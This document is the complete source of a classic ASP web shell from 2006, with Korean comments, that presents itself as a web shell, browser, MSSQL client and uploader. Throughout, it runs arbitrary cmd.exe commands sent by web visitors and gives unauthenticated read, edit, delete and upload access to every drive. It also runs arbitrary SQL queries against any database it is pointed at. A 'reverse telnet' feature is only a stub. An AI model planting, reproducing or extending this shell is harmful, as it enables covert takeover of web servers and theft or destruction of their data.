<%
	   ' Made by xCuter (강봉구) in 2006.02.01 (xxcuter@hotmail.com)
        On Error Resume Next
        DIM this
		       this = request.servervariables("url")
	    DIM cancel
		       cancel = "<input type=button value=Cancel!! onclick=document.location='"&this&"?command=';>"
		DIM command
		       command = request("command")

        Response.Write "<html><head><title>xCuter's ASP WebShell & Web Browser & MSSQL Client & File Uploader & Reverse Telnet V1.0</title><meta http-equiv=content-type content=charset=euc-kr>"
%>
<!--it's a zeroboard source code - copy & paste & modify -_- -->
<script language='JavaScript'>
	var select_obj;
	function LayerAction(name,status) { 
		var obj=document.all[name];
		var _tmpx,_tmpy, marginx, marginy;
		_tmpx = event.clientX + parseInt(obj.offsetWidth);
		_tmpy = event.clientY + parseInt(obj.offsetHeight);
		_marginx = document.body.clientWidth - _tmpx;
		_marginy = document.body.clientHeight - _tmpy;
		if(_marginx < 0)
			_tmpx = event.clientX + document.body.scrollLeft + _marginx ;
		else
			_tmpx = event.clientX + document.body.scrollLeft ;
		if(_marginy < 0)
			_tmpy = event.clientY + document.body.scrollTop + _marginy +20;
		else
			_tmpy = event.clientY + document.body.scrollTop ;
		obj.style.posLeft=_tmpx-25;
		obj.style.posTop=_tmpy-25;
		if(status=='visible') {
			if(select_obj) {
				select_obj.style.visibility='hidden';
				select_obj=null;
			}
			select_obj=obj;
		}else{
			select_obj=null;
		}
		obj.style.visibility=status; 
	}

	function View_Layer(name, file, edit, copy, move, del, newfolder, newfile, url) {
		var printHeight = 0;
		var printMain="";
		if(file) {
			printMain = "<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=window.open('"+file+"');><td style=color:white;font-size:9pt height=18 nowrap>:: 브라우져로 열기 :: </td></tr>";
			printHeight = printHeight + 16;
		}
		if(edit) {
			printMain = printMain+"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='<%=this%>?command=browser&url="+url+"&mode=edit&file="+edit+"';><td style=color:white;font-size:9pt height=18 nowrap>:: 소스 편집/보기 :: </td></tr>";
			printHeight = printHeight + 16;
		}
		if(move) {
			printMain = printMain+"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='<%=this%>?command=browser&url="+url+"&mode=move&file="+edit+"';><td style=color:white;font-size:9pt height=18 nowrap>:: 이름 바꾸기 :: </td></tr>";
			printHeight = printHeight + 16;
		}
		if(copy) {
			printMain = printMain+"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='<%=this%>?command=browser&url="+url+"&mode=copy&file="+edit+"';><td style=color:white;font-size:9pt height=18 nowrap>:: 파일 복사 :: </td></tr>";
			printHeight = printHeight + 16;
		}
		if(del) {
			printMain = printMain+"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='<%=this%>?command=browser&url="+url+"&mode=del&file="+edit+"';><td style=color:white;font-size:9pt height=18 nowrap>:: 삭제 하기 :: </td></tr>";
			printHeight = printHeight + 16;
		}
		if(newfolder) {
			printMain = printMain+"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='<%=this%>?command=browser&url="+url+"&mode=newfolder';><td style=color:white;font-size:9pt height=18 nowrap>:: 새 폴더 만들기 :: </td></tr>";
			printHeight = printHeight + 16;
		}
		if(newfile) {
			printMain = printMain+"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='<%=this%>?command=browser&url="+url+"&mode=newfile';><td style=color:white;font-size:9pt height=18 nowrap>:: 새 파일 만들기 :: </td></tr>";
			printHeight = printHeight + 16;
		}
		var printHeader = "<div id='"+name+"' style='position:absolute; left:20px; top:20px; width:130; height: "+printHeight+"; z-index:1; visibility: hidden' onMousedown=LayerAction('"+name+"','hidden')><table border=0><tr><td colspan=3 onMouseover=LayerAction('"+name+"','hidden') height=3></td></tr><tr><td width=5 onMouseover=LayerAction('"+name+"','hidden') rowspan=2> </td><td height=5></td></tr><tr><td><table style=cursor:hand border='0' cellspacing='1' cellpadding='0' bgcolor='black' width=100% height=100%><tr><td valign=top bgcolor=white><table border=1 bgcolor=black cellspacing=0 cellpadding=3 width=100% height=100%>";
		var printFooter = "</table></td></tr></table></td><td width=5 rowspan=2 onMouseover=LayerAction('"+name+"','hidden')> </td></tr><tr><td colspan=3 height=10 onMouseover=LayerAction('"+name+"','hidden')></td></tr></table></div>";
	
		document.writeln(printHeader+printMain+printFooter);
	}
</script>
<%
		Response.Write "</head><p style='line-height:5mm;font-size:12pt;color:#CCCCCC;'>Commands are : <font color=F38900><a onfocus=blur() onclick=location='"&this&"?command=sql' style='cursor:hand';>sql</a></font>, <font color=F38900><a onfocus=blur() onclick=location='"&this&"?command=upload' style='cursor:hand';>upload</a></font>, <font color=#F38900><a onfocus=blur() onclick=location='"&this&"?command=reverse' style='cursor:hand';>reverse</a>, <a onfocus=blur() onclick=location='"&this&"?command=browser&url="&Replace(Server.MapPath("."),"\","\\")&"' style='cursor:hand';>browser</a></font>"

'*********************************************************
' ASP스크립트 실행권한은 있으나 Run.Exec 등의 Method의 사용시 브라우져 기능
'*********************************************************
          IF Left(command,7)="browser" AND Len(command)=7 Then
              IF Len(Request.QueryString("mode"))>0 Then
' 파일 편집 모드
				  IF Request.QueryString("mode")="edit" Then
			  	      IF Len(Request.QueryString("file"))>0 Then
                          Dim file
						         file=Request.QueryString("file")
                          Set FP=Server.CreateObject("Scripting.FileSystemObject")
                          Set RFILE=FP.OpenTextFile(file, 1, False, 0)
                          Set INFO=FP.GetFile(file)
								 IF INFO.size = 0 Then
								     Contents=chr(13)
								 Else
								     Contents=RFILE.ReadAll
								 End IF
						  IF(IsObject(RFILE)) Then
                              On Error Resume Next
							  Response.Write "<body onfocus=writeform.contents.focus();><form method=POST name=writeform action="&this&"?command=browser&url="&Replace(Request.QueryString("url")," ", "%20")&"&mode=save&file="&Replace(Request.QueryString("file")," ", "%20")&">"
							  Response.Write "<input type=submit value=Save!!> <input type=button value='Go Back' onClick=history.back();>"
							  Response.Write "<br><textarea name=contents style='width:100%;height:500;background-color=black;color=#cccccc'>"&Contents&"</textarea><br>"
							  Response.Write "<input type=submit value=Save!!> <input type=button value='Go Back' onClick=history.back();>"
							  Response.Write "</form>"
                              RFILE.Close
                          End IF
			          End IF ' file 이 있다면
' 편집된 파일 save하기
				  Else IF Request.QueryString("mode")="save" And Len(Request.Form("contents")) <> "" Then
                      SET FP=Server.CreateObject("Scripting.FileSystemObject")
                      SET File=FP.OpenTextFile(Request.QueryString("file"), 2, False, 0)
					         File.Write(Request.Form("contents"))
                      File.Close
' 파일 이름 바꾸기
	              Else IF Request.QueryString("mode")="move" Then
							 Old_File=Request.QueryString("file")
							 Name1=Right(Old_File, (InStr(StrReverse(Old_File), "/"))-1) ' 파일명 추출-_-쩝
                             IF Len(Request.QueryString("newfilename")) >1 And Request.QueryString("newfilename") <> "null"  Then
								 New_File=Request.QueryString("newfilename")
                                 Set FP=CreateObject("Scripting.FileSystemObject")
								 Set Target=FP.GetFile(Old_File)
								 Target.Move(Request.QueryString("url")&"/"&New_File)
                                 Set Target=Nothing
							 Else
                                 Response.Write "<body bgcolor=black><font color=#cccccc><script>Filename=prompt('Input New Filename', '"&Name1&"'); if(Filename!='' || Filename!=null || Filename.Length<1) location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"&mode=move&file="&Request.QueryString("file")&"&newfilename='+Filename; else location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"';</script>"
							 End IF
' 파일 삭제하기
	              Else IF Request.QueryString("mode")="del" Then
							 Set FP=CreateObject("Scripting.FileSystemObject")
							 Set File=FP.GetFile(Request.QueryString("file"))
							       File.Delete
							 Set File=Nothing
							 Set FP=Nothing
' 파일 복사
	              Else IF Request.QueryString("mode")="copy" Then
							 Old_File=Request.QueryString("file")
'							 Name1=Right(Old_File, (InStr(StrReverse(Old_File), "/"))-1) ' 파일명 추출-_-쩝
                             IF Len(Request.QueryString("newfilename")) >1 And Request.QueryString("newfilename") <> "null"  Then
								 New_File=Request.QueryString("newfilename")
                                 Set FP=CreateObject("Scripting.FileSystemObject")
								 Set Target=FP.GetFile(Old_File)
								 Target.Copy(New_File)
                                 Set Target=Nothing
							 Else
                                 Response.Write "<body bgcolor=black><font color=#cccccc><script>Filename=prompt('Copy to', '"&Old_File&"'); if(Filename!='' || Filename!=null || Filename.Length<1) location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"&mode=copy&file="&Request.QueryString("file")&"&newfilename='+Filename; else location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"';</script>"
							 End IF
' 새 파일
				  Else IF Request.QueryString("mode")="newfile" Then
                             IF Len(Request.QueryString("mkfilename")) >1 And Request.QueryString("mkfilename") <> "null"  Then
                                 Set FP=CreateObject("Scripting.FileSystemObject")
								       NewFile=Request.QueryString("url")&"/"&Request.QueryString("mkfilename")
								       IF FP.FileExists(NewFile) Then
									       Response.Write "<body bgcolor=black><script>alert('이미 "&Request.QueryString("mkfilename")&"파일이 존재합니다.');history.go(-2);</script>"
									   End IF
								       FP.CreateTextFile(NewFile)
                                 Set FP=Nothing
							 Else
                                 Response.Write "<body bgcolor=black><font color=#cccccc><script>Filename=prompt('New File Name?', ''); if(Filename!='' || Filename!=null || Filename.Length<1) location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"&mode=newfile&mkfilename='+Filename; else location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"';</script>"
							 End IF
' 새 폴더
				  Else IF Request.QueryString("mode")="newfolder" Then
                             IF Len(Request.QueryString("mkfoldername")) >1 And Request.QueryString("mkfoldername") <> "null"  Then
                                 Set FP=CreateObject("Scripting.FileSystemObject")
                                       NewFolder=Request.QueryString("url")&"/"&Request.QueryString("mkfoldername")
									   FP.CreateFolder(NewFolder)
                                 Set FP=Nothing
							 Else
                                 Response.Write "<body bgcolor=black><font color=#cccccc><script>Foldername=prompt('New Folder Name?', ''); if(Foldername!='' || Foldername!=null || Foldername.Length<1) location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"&mode=newfolder&mkfoldername='+Foldername; else location.href='"&this&"?command=browser&url="&Request.QueryString("url")&"';</script>"
							 End IF
				  End IF '룰루
				  End IF '랄라
				  End IF '이건뭘까
				  End IF 'ㅎㅎ
                  End IF '알려하지마
                  End IF '다쳐.
				  End IF '똥이나눠야지
			  End IF     '안뇽

          DIM Here
		  SET FP     = Server.CreateObject("Scripting.FileSystemObject")
		  IF Len(Request.QueryString("url"))>0 Then
              Here=Request.QueryString("url")
			  SET INFO = FP.GetFolder(Here)
          ELSE
		      Here=Server.Mappath(".")
		      SET INFO = FP.GetFolder(Here)
		  END IF

		  Response.Write "<body bgcolor=black><font color=#cccccc><HR>" & Replace(Here,"\\","\") &"&nbsp; &nbsp; &nbsp; &nbsp; "& cancel

		  '폴더리스트 & 파일리스트
		  SET DIR_LIST = INFO.Subfolders
          SET FILE_LIST= INFO.Files

          Response.Write "<HR>"
          IS_Folder=FP.GetParentFolderName(Here)
		  IF Len(IS_Folder) <> 0 Then
		      Response.Write "<span style='font-size:11pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[UP]&nbsp;<a onfocus=blur() onClick=document.location='"&this&"?command=browser&url="&Replace(INFO.ParentFolder, "\","\\")&"' style='cursor:hand'> <font color=black>　　　　　　　　　　　　　　　　 <font color=#ff6633>‥</a><br>"
		  Else
          ' 이거 For i=a to z   \    fp.getdrive(i) 안되네--; 아님 for i=97 to 125까진가-- chr(i) 도 안되고-_- 어쩌란겨 help--;
		  SET ISDIR=FP.GetDrive("C")
          IF ISDIR.isReady=True Then DriveList=DriveList & "<span style='font-size:11pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[<a onfocus=blur() onClick=document.location='"&this&"?command=browser&url=c:\\' style='cursor:hand'>C:</a>]<br>" END IF
		  SET ISDIR=FP.GetDrive("D")
          IF ISDIR.isReady=True Then DriveList=DriveList & "<span style='font-size:11pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[<a onfocus=blur() onClick=document.location='"&this&"?command=browser&url=d:\\' style='cursor:hand'>D:</a>]<br>" END IF
		  SET ISDIR=FP.GetDrive("E")
          IF ISDIR.isReady=True Then DriveList=DriveList & "<span style='font-size:11pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[<a onfocus=blur() onClick=document.location='"&this&"?command=browser&url=e:\\' style='cursor:hand'>E:</a>]<br>" END IF
		  SET ISDIR=FP.GetDrive("F")
          IF ISDIR.isReady=True Then DriveList=DriveList & "<span style='font-size:11pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[<a onfocus=blur() onClick=document.location='"&this&"?command=browser&url=f:\\' style='cursor:hand'>F:</a>]<br>" END IF
		  SET ISDIR=FP.GetDrive("G")
          IF ISDIR.isReady=True Then DriveList=DriveList & "<span style='font-size:11pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[<a onfocus=blur() onClick=document.location='"&this&"?command=browser&url=g:\\' style='cursor:hand'>G:</a>]<br>" END IF
		  SET ISDIR=FP.GetDrive("H")
          IF ISDIR.isReady=True Then DriveList=DriveList & "<span style='font-size:11pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[<a onfocus=blur() onClick=document.location='"&this&"?command=browser&url=h:\\' style='cursor:hand'>H:</a>]<br>" END IF

		  Response.Write DriveList
		  End IF
		  For Each Folder In DIR_LIST
			   Response.Write "<span style='font-size:10pt;font-family:굴림체;color:#ff6633;text-decoration:none'>[DIR ] "&Folder.DateCreated
               IF Len(Folder.DateCreated)<22 Then Response.Write "&nbsp;&nbsp;" ELSE Response.Write "&nbsp;" END IF
               ' Align
		       For i=1 To 12
			       Response.Write "&nbsp;"
			   Next
			   Response.Write " <a onfocus=blur() onClick=document.location='"&this&"?command=browser&url="&Replace(Replace(Replace(Here&"\"&Folder.Name, "\","\\")," ","%20"), "\\\\", "\\") &"' style='cursor:hand'>"&Folder.Name&"</a><br>"
          Next

		  For Each File In FILE_LIST
			   Response.Write "<span style='font-size:10pt;font-family:굴림체;color:#cccccc;text-decoration:none'>[FILE] "&File.DateCreated
			   IF Len(File.DateCreated)<22 Then Response.Write "&nbsp;&nbsp;&nbsp;" ELSE Response.Write "&nbsp;&nbsp;" END IF
               Response.Write File.Size
               ' Align
			   IF Len(File.Size)<11 Then
			       For i=Len(File.Size) To 11
				   Response.Write "&nbsp;"
				   Next
			   End IF
			   i=1   ' 레이어 넘버 계산
			   j=j+i ' 레이어 넘버 계산
			   loc=Len(Server.mappath("/"))
			   IF Len(Request.QueryString("url")) > 0 Then
                   url_file=Replace(Mid(Request.QueryString("url"), loc+1),"\","/")&"/"&File.Name
				   srv_file=Replace(Request.QueryString("url")&"\"&File.Name, "\", "/")
			   Else
			       url_file=Replace(Mid(Server.Mappath("."), loc+1),"\","/")&"/"&File.Name
				   srv_file=Replace(Server.Mappath(".")&"\"&File.Name, "\", "/")
			   End IF ' 내가봐도 소스 드럽구나-_-
               IF Instr(Replace(LCase(Request.QueryString("url")),"\","/"), Replace(LCase(Server.MapPath("/")),"\","/")) < 1 Then
                   Response.Write "<script>View_Layer('Layer"&j&"', '', '"&Replace(srv_file," ","%20")&"', '1', '1', '1', '1', 'newfile','"&Replace(Replace(INFO.Path,"\","/")," ", "%20")&"');</script>"
			   Else
                   Response.Write "<script>View_Layer('Layer"&j&"', '"&Replace(url_file," ","%20")&"', '"&Replace(srv_file," ","%20")&"', '1', '1', '1', '1', 'newfile','"&Replace(Replace(INFO.Path,"\","/")," ", "%20")&"');</script>"
			   End IF
               Response.Write "<span onMousedown=LayerAction('Layer"&j&"','visible');  style='cursor:hand'>"&File.Name&"</span><br>"

		   NEXT

		   Response.Write "<HR>"

'*****************************************************
' 리버스 텔넷
'*****************************************************
      ELSE IF Left(command,7)="reverse" AND Len(command)=7 Then
	      Response.Write "<body bgcolor=black><font color=#cccccc size=2><HR>준비중...&nbsp;" &cancel

'*****************************************************
' 파일 업로드
'*****************************************************
      ELSE IF Left(command,6)="upload" AND Len(command)=6 Then
	      Response.Write "<body bgcolor=black><font color=#cccccc><HR>Support  Upload Components : File Manager, ABCUpload, aspSmartUpload, DextUpload"
		  IF Request.QueryString("ok")=1 Then
		         Set objRequest = Server.CreateObject("FileMan.FileUpLoad")
                 objRequest.SaveFile "afile1", objRequest.GetValueByName("afile1")
                 objRequest.SaveFile "afile2", objRequest.GetValueByName("afile2")
                 objRequest.SaveFile "afile3", objRequest.GetValueByName("afile3")

			  IF Err Then
				  Set objRequest = Server.CreateObject("ABCUpload4.XForm")
				  objRequest.Overwrite = True
		          Set FILE = objRequest.Files("afile1")
			      IF FILE.FileExists Then FILE.Save FILE.FileName
		          Set FILE = objRequest.Files("afile2")
			      IF FILE.FileExists Then FILE.Save FILE.FileName
		          Set FILE = objRequest.Files("afile3")
			      IF FILE.FileExists Then FILE.Save FILE.FileName

				  IF Err Then
					Set objRequest = Server.CreateObject("aspSmartUpload.SmartUpload")
					objRequest.Upload
					For Each File In objRequest.Files
						IF Not File.IsMissing Then
							File.SaveAs(Server.MapPath(".")&"\"&file.FileName)
						End IF
					NEXT

					IF Err Then
						Set objRequest = Server.CreateObject("DEXT.FileUpload")
						objRequest.DefaultPath = Server.MapPath(".")
						objRequest("afile1").Save 'be able to objRequest.Save
						objRequest("afile2").Save 
						objRequest("afile3").Save 
						Set objRequest = Nothing 
					End IF 'DextUp
				  End IF 'aspSmartUp
			  End IF 'ABCUp

       		  Response.Redirect this
		  Else 'upload form
			  Response.Write "<form method=post action="&this&"?command=upload&ok=1 name=uploadform enctype=multipart/form-data>"
			  Response.Write "<input type=file name=afile><br><input type=file name=afile2><br><input type=file name=afile3>"
			  Response.Write " &nbsp;<input type=submit value=Upload!!> "&cancel&"</form>"
		  End IF

'*****************************************************
'SQL Client
'*****************************************************
	  ELSE IF Left(command,3)="sql" AND Len(command)=3 Then
      Response.Write "<body bgcolor=black><font color=#cccccc size=2><HR>"

      str=Request.Form("str")
	  ok=Request.Form("ok")
      query=Request.Form("query")

      IF ok <> 1 Then 
	  %>
	         <form name=conn action=<%=this%> method=post>
			 <input type=hidden name=ok value=1>
			 <input type=hidden name=command value=sql>
	         Connection Strings: <input type=text name=str size=70 value='<%=str%>'>   
			 <input type=submit value=Connect!!>   <%=cancel%><p>
			 예제1) " Provider=<font color=red>SQLOLEDB<font color=#cccccc>;Password=<font color=red>Password<font color=#cccccc>;Persist Security Info=True;User ID=<font color=red>ID<font color=#cccccc>;Initial Catalog=<font color=red>DB Name<font color=#cccccc>;Data Source=<font color=red>(local)<font color=#cccccc>"<p>
			 예제2) " Provider=<font color=red>SQLOLEDB<font color=#cccccc>;Data Source=<font color=red>Server IP<font color=#cccccc>;user ID=<font color=red>User ID<font color=#cccccc>;password=<font color=red>User Password<font color=#cccccc>;Initial Catalog=<font color=red>Database Name<font color=#cccccc>; "<p>
			 예제3) " Provider=<font color=red>SQLOLEDB<font color=#cccccc>;user ID=<font color=red>sa<font color=#cccccc>;password=<font color=red>User Password<font color=#cccccc>; Data Source=<font color=red>WEBDB<font color=#cccccc>;"<p>
             예제4) " DSN=<font color=red>DSN Name<font color=#cccccc>;UID=<font color=red>User ID<font color=#cccccc>;PWD=<font color=red>Password<font color=#cccccc> "<p>
			 예제5) " Driver=<font color=red>SQL Server<font color=#cccccc>; Server=; UID=<font color=red>User ID<font color=#cccccc>; PWD=<font color=red>Password<font color=#cccccc>; Database=<font color=red>Database Name<font color=#cccccc>"
             </form><br>
	  <%
             Response.End
	  Else
		 Dim DBCON, strConnect, SQL, Rs
%>
		 <body onload=inputquery.query.focus(); bgcolor=black>
         <form name=inputquery action=<%=this%>?command=sql method=post><input type=hidden name=ok value=1>
         Connection Strings: <input type=text name=str size=70 value='<%=str%>'>   
		 <input type=submit value=Connect!!>   <%=cancel%><HR>

         Query> <input type=text name=query value='' size=60 style='border:0;background-color:black;color:#cccccc'> [History: <%=query%>]
                 	  <input type=submit value='' style='width:0;height:0'>
<%
		  strConnect = str

		  IF query="" Then
		      Response.End
		  End IF

		  Set DBCON = Server.CreateObject("ADODB.Connection")
		  DBCON.Open strConnect
		  IF Err Then
		      Response.Write "<font color=red><p>알림 : DB연결 실패!! 연결정보를 다시 확인하세요.</font>"
		  	Set objRequest = Nothing
		  	Response.End
		  End If

		  Set Rs = Server.CreateObject("ADODB.RecordSet")
		  Rs.Open query, DBCON
		  IF  Err Then
		      Response.Write "<font color=red><p>알림 : 쿼리문 실패! 문장을 다시 확인해 주세요.</font>"
		      Response.End
		  End IF
             Response.Write "<HR><span style='font-size:9pt'>"
			 DIM CNT, i
	         CNT = Rs.fields.count
			 DO UNTIL Rs.eof
			    FOR i=0 TO CNT-1
				    Response.Write Rs(i) &"<br>"
				NEXT
				Rs.movenext
			LOOP
			Response.Write "</span>"
 
		  Rs.Close	
		  SET DBCON = Nothing
	End IF

'*****************************************************
' 명령실행
'*****************************************************
	  ELSE
		DIM prompt
		       prompt = Server.mappath(".")
	    Set  CMD=Server.CreateObject("Wscript.Shell")
		Set     FP=Server.CreateObject("Scripting.FileSystemObject")

		IF command <> "" Then
		    Tempfile=prompt & "\" & FP.GetTempName()
            On Error Resume Next
			Call CMD.Run ("cmd.exe /c " & command &" > " & Tempfile & " 2> " & Tempfile & "err", 0, True)
            IF Err Then
				  cmdResult=CMD.exec("cmd.exe /c "&command).Stdout.ReadAll() 'Run Method 실패시 Exec Method 시도
                  FP.CreateTextFile Tempfile, true
				  Set FILE=FP.OpenTextFile(Tempfile, 2)
				  FILE.WriteLine(cmdResult)
				  FILE.close
		    End IF

            IF FP.FileExists(TempFile) = False Then ' 현재 폴더에서 랜덤파일 생성 실패시 c:\ 에서 시도-_-
                Tempfile="c:\" & FP.GetTempName()
				Call CMD.Run("cmd.exe /c " & command &" > " & Tempfile & " 2> " & Tempfile & "err", 0, True)
			End IF

			Set FILE  =FP.OpenTextFile(TempFile, 1, False, 0)
			Set FILE2=FP.OpenTextFile(TempFile & "err", 1, False, 0)
		End IF
%>
		<body onload=xcu.command.focus(); bgcolor=black color=#CCCCCC>
		<form name=xcu action=<%=request.servervariables("url")%> method=post>
		<%=prompt%>> <INPUT TYPE=TEXT NAME=command VALUE='' SIZE=45 style=border:0;background-color:black;color=#cccccc> [History : <%=command%>]
			  <INPUT TYPE=SUBMIT VALUE='' style='width:0;height:0'>
		<HR><font color=#cccccc>
<%
        IF(IsObject(FILE)) Then
		    On Error Resume Next
			Set FILEINFO=FP.GetFile(Tempfile)
			IF FILEINFO.Size<>0 Then
			    Response.Write "<pre>" & Server.HTMLEncode(FILE.ReadAll) & "</pre>"
			ELSE
			    Response.Write "<pre>" & Server.HTMLEncode(FILE2.ReadAll) & "</pre>"
			End IF
			FILEINFO.Close
			CMD.Close
			FILE.Close
			FILE2.Close
			Call FP.DeleteFile (TempFile, True)
            Call FP.DeleteFile (TempFile & "err", True)
		End IF
	End IF
    End IF
    End IF
%>
</font><HR>
</body>
</form>
</html>
<%
End IF
%>
